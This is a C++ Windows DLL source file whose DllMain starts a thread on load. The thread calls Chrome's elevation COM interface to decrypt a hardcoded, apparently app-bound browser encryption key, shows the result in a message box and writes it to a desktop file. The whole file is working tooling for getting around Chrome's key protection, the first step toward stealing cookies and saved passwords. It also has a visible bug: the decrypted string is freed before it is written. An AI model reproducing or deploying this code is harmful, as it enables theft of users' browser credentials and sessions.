// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <objbase.h>
#include <string>
#include <vector>

typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3

} PROTECTION_LEVEL;

typedef struct IElevator IElevator;

typedef struct IElevatorVtbl
{
    // IUnknown
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevator* This);

    // IElevator
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevator* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD           caller_proc_id,
        ULONG_PTR* proc_handle
        );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevator* This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );

    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevator* This,
        const BSTR      ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );

} IElevatorVtbl;

struct IElevator
{
    IElevatorVtbl* lpVtbl;
};

const std::string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_decode(const std::string& encoded_string) {
    // Loại bỏ padding (dấu "=")
    size_t in_len = encoded_string.size();
    size_t i = 0, j = 0;
    size_t len = (in_len / 4) * 3;

    std::vector<unsigned char> decoded_data(len, 0);

    for (size_t idx = 0; idx < in_len; idx += 4) {
        unsigned char a = encoded_string[idx] == '=' ? 0 : BASE64_CHARS.find(encoded_string[idx]);
        unsigned char b = encoded_string[idx + 1] == '=' ? 0 : BASE64_CHARS.find(encoded_string[idx + 1]);
        unsigned char c = encoded_string[idx + 2] == '=' ? 0 : BASE64_CHARS.find(encoded_string[idx + 2]);
        unsigned char d = encoded_string[idx + 3] == '=' ? 0 : BASE64_CHARS.find(encoded_string[idx + 3]);

        decoded_data[i++] = (a << 2) | (b >> 4);
        decoded_data[i++] = (b << 4) | (c >> 2);
        decoded_data[i++] = (c << 6) | d;
    }

    return std::string(decoded_data.begin(), decoded_data.end());
}


void DecryptKey() {
    CLSID ChromeCLSID = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
    IID ChromeIID = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
    IID ChromeIID2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 }};
	IElevator* pElevator = NULL;
	HRESULT hr;
	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		MessageBoxA(NULL, "Failed to initialize COM library.", "Error", MB_OK | MB_ICONERROR);
		// Handle initialization failure
		return;
	}

	hr = CoCreateInstance(
		ChromeCLSID,
		nullptr,
		CLSCTX_LOCAL_SERVER,
        ChromeIID2,
		reinterpret_cast<void**>(&pElevator)
	);

    if (FAILED(hr)) {
        hr = CoCreateInstance(
            ChromeCLSID,
            nullptr,
            CLSCTX_LOCAL_SERVER,
            ChromeIID,
            reinterpret_cast<void**>(&pElevator)
        );
    }
	if (FAILED(hr)) {
		char errorMsg[256];
		sprintf_s(errorMsg, "Failed to create COM instance. HRESULT: 0x%08X", (unsigned int)hr);
		MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
		CoUninitialize();
		return;
	}

    hr = CoSetProxyBlanket(
        (IUnknown*)pElevator,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
	);

    
	BSTR decryptedDataBSTR = NULL;
	DWORD dwLastError = 0;
	std::string encKeyB64 = {'Q', 'V', 'B', 'Q', 'Q', 'g', 'E', 'A', 'A', 'A', 'D', 'Q', 'j', 'J', '3', 'f', 'A', 'R', 'X', 'R', 'E', 'Y', 'x', '6', 'A', 'M', 'B', 'P', 'w', 'p', 'f', 'r', 'A', 'Q', 'A', 'A', 'A', 'C', 'P', 'D', 'L', 'E', 'r', 'v', '5', 'C', 'l', 'M', 't', 'b', 'A', 'c', 'Y', 'H', 'F', 'e', 'm', 'A', 'o', 'Q', 'A', 'A', 'A', 'A', 'H', 'A', 'A', 'A', 'A', 'E', 'c', 'A', 'b', 'w', 'B', 'v', 'A', 'G', 'c', 'A', 'b', 'A', 'B', 'l', 'A', 'C', 'A', 'A', 'Q', 'w', 'B', 'o', 'A', 'H', 'I', 'A', 'b', 'w', 'B', 't', 'A', 'G', 'U', 'A', 'A', 'A', 'A', 'Q', 'Z', 'g', 'A', 'A', 'A', 'A', 'E', 'A', 'A', 'C', 'A', 'A', 'A', 'A', 'B', 'u', 'l', 'j', 'o', '1', '4', 'p', 'G', 'C', 'T', 'D', 'd', 'G', 'N', 'X', 'V', 'F', 'f', '/', 'g', 'w', 'c', 'W', 'T', '9', 'u', 'n', 'e', 'N', 'i', 'j', '/', 'c', '5', 'w', 'B', 'U', 'W', 'A', 's', '0', 'l', 'g', 'A', 'A', 'A', 'A', 'A', 'O', 'g', 'A', 'A', 'A', 'A', 'A', 'I', 'A', 'A', 'C', 'A', 'A', 'A', 'A', 'D', '9', '2', 'Z', 'a', 'X', 'c', 'i', 'b', 'o', 'l', '4', 'C', 't', 'l', 'x', 'Q', '4', 'k', '8', 'l', 'x', 'x', 'W', 'O', 'I', 'd', 'Q', '/', 'J', 'c', 'c', '9', 'B', 'X', '6', 'x', 'Z', '7', 'J', 'O', 'a', '4', '5', 'A', 'B', 'A', 'A', 'C', 'T', 'x', '3', 'j', 'i', 'U', 'r', 'g', '6', 'W', 'l', 'o', 'v', 'o', 'c', 'v', 'a', 'g', 'G', '7', 'O', 'Z', 'g', 'E', 'h', 'j', 'r', 'K', 'v', 't', 'D', 'H', 'K', 'U', '3', 'f', 'M', 'T', 'B', 'M', 'd', 'P', 'J', 'L', 'j', 'q', 'F', 'T', 'o', 'm', 'Y', 'A', 'l', '4', 'S', 'o', 'T', 'X', 'x', '/', 'U', 'W', 'a', '4', '4', '6', '5', 'B', '9', 'R', 'p', 'c', 'O', 'S', 'o', 'E', '/', 'L', 'V', 'T', 'R', 'T', '0', 'j', '5', '1', '5', 'L', 'M', 'x', 'P', '5', 'h', 's', '0', 'D', 'u', 'J', 'Y', '/', 'o', 'L', '9', '8', '3', 'L', '4', 'r', 'q', 'S', 'R', 'h', '1', 'C', 'z', 'G', 'j', 'o', 'E', '+', 'm', 'Z', 'Q', '7', 'g', 'v', '8', 'u', '0', 'L', 'B', 'L', 't', 'K', '3', 'S', 'L', 'd', 'L', 'V', 'W', 'r', 'Z', 'S', 'V', 'n', 'b', '/', 'J', 'z', 'O', 'U', 'A', 'y', '4', 'd', '4', 'N', 'M', 't', '+', 'D', 'X', 'L', '+', 'v', 'E', 'v', 'k', '/', 'Y', 'k', 'D', 'J', '8', 'P', '8', '8', 'T', 'p', 'z', 'V', 'p', 'e', 'a', 'Y', 'D', '3', '8', 'O', 'P', 'g', '3', 'i', '0', 'n', '0', 's', 'X', 'S', 'A', 'a', 'E', '6', '0', 's', 'S', 'g', 'i', 's', 'N', 'c', 'Y', 'g', 'W', 'N', 'M', '1', 'M', 'v', 'J', '6', 'N', 'W', 'N', 'K', '1', 'o', '7', 'z', 'n', 'G', 'h', 'm', 'G', '0', 'W', 'C', 'V', 'J', 'd', 'e', 'f', 'o', 'H', '/', 'X', 'o', 'p', '9', '0', 'u', 'Z', 'v', 'Y', '7', 'e', 'I', 'u', 'N', '9', 'x', 'U', '+', '0', 'D', 'm', 'R', '1', 'v', 'x', 'H', '3', 'k', '1', 'I', 'Z', 'u', 'e', 'r', 'Z', 'w', 'L', '9', 'K', 'a', 'O', 'u', 'F', 'c', '4', 'G', 'W', 'C', 'u', 'F', '/', 'g', 'L', 'y', 'j', 'O', 'v', 'U', 'c', 'Q', 'Y', '7', 'B', 'C', 't', 'g', 'x', 'p', 'O', '2', 'm', 'D', 'E', 'b', '4', 'L', 'w', 'x', 'W', 'n', 'h', 'C', '5', '+', 'l', 'k', 'x', 'b', '1', 'N', 'S', 'I', 'O', 's', 'w', 'l', 'A', '4', 's', '8', 'c', 'K', 'o', 'G', '3', 'M', 'U', 'D', 'J', 'j', '1', 'a', 'A', 'O', 'p', 'b', 'n', 'V', 'z', 'Z', '0', 'x', 'p', 'M', '0', '1', 'U', 'k', 'w', 'Y', 't', 'U', 'G', 'x', 'd', '4', 'H', '2', 'V', 'R', 'H', '6', 'e', 'h', 'C', 'k', 'P', '8', 'X', 'e', '4', 'w', 'f', 'Z', 'u', 'n', '/', 'o', 'n', 'C', 'P', 'Q', 'N', 'H', 'A', '7', 'y', '6', 'T', 'n', 'n', '/', 'p', '+', 'V', 'J', '9', 'l', '/', 'h', 'E', 'B', 'n', 'H', '4', 'Q', '+', 'T', 'u', 'G', 'j', '4', 'W', 'o', '0', 'N', 'n', 'l', 'w', 'b', 'N', 'U', 'E', '6', '9', 'C', 'U', 'a', 'W', 'w', 'a', 'E', 'l', 'H', 'q', '4', '8', 'y', 'y', 'j', 'n', 'V', 'G', '2', 'P', '4', 'B', 'n', 'S', 'G', 'W', 'u', 'F', 'm', 'p', 'e', 'u', 'r', 'L', 'J', 'u', '4', 'R', 'a', 'd', '2', '7', 'E', 'I', '6', 'B', 'd', '0', 'q', 'v', 'P', 'O', '6', 'W', 'h', 'k', 'f', '/', 'a', 'i', 'G', 'H', 'V', '+', 'E', 'i', '6', 'T', 'X', 'f', 'Y', 'x', 'e', 'y', '9', 'n', 'X', '/', 'm', 'Y', '/', 'T', 'Q', 'A', 'A', 'A', 'A', 'D', 'C', '3', 'Q', 'i', 'w', 'P', 'c', 'J', 'y', 'O', 'z', 'V', 'e', '4', 'c', '0', 'J', 'W', '+', 'K', 'S', '7', 'M', 'm', '5', 'T', 'R', '9', 'p', 'J', 'L', 'k', 'T', '8', 'Z', '+', 'z', 'r', '3', 'd', 'm', 'Y', 'e', '5', 'W', 'o', 'O', 'A', 'L', 'W', 'L', 'o', 'M', 'K', 'F', '8', 'J', 'v', 'K', 'C', 'm', 't', '9', 'N', 'a', 'K', 'e', 'c', 'o', 'j', 'g', 'n', 'h', 'o', 'S', 'p', 'Q', 'i', '8', 'M', 'C', 'n', 'A', 'W', 'A', '='};
    std::string encKey = base64_decode(encKeyB64);

	BSTR bstrEncKey = SysAllocStringByteLen(encKey.data() + 4, (UINT)encKey.size() -4);

	hr = pElevator->lpVtbl->DecryptData(pElevator, bstrEncKey, &decryptedDataBSTR, &dwLastError);

	if (bstrEncKey) {
		SysFreeString(bstrEncKey);
	}

	if (FAILED(hr)) {
		char errorMsg[256];
		sprintf_s(errorMsg,  "Failed to decrypt data. HRESULT: 0x%08X", (unsigned int)hr);
		MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
		// Handle decryption failure
	} else {
		//MessageBox if decryption is successful
		MessageBoxA(NULL, (char*)decryptedDataBSTR, "Decrypted Data", MB_OK | MB_ICONINFORMATION);
		SysFreeString(decryptedDataBSTR);
        //Write key to file in desktop
		HANDLE hFile = CreateFileA("C:\\Users\\levuong\\Desktop\\decrypted_key.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hFile, decryptedDataBSTR, SysStringByteLen(decryptedDataBSTR), NULL, NULL);
		CloseHandle(hFile);
	}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DecryptKey, NULL, 0, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

